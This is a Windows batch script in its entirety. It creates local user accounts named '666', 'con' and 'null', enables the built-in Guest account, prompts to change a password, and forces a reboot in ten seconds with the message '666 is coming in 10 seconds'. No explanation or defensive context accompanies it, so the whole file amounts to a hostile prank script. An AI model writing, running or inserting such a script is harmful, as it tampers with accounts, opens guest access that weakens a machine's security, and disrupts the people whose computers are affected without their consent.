@echo off
net user 666 /add
net user con /add
net user null /add
net user Guest /active:yes
net user {666} *
shutdown /r /t 10 /c "666 is coming in 10 seconds"
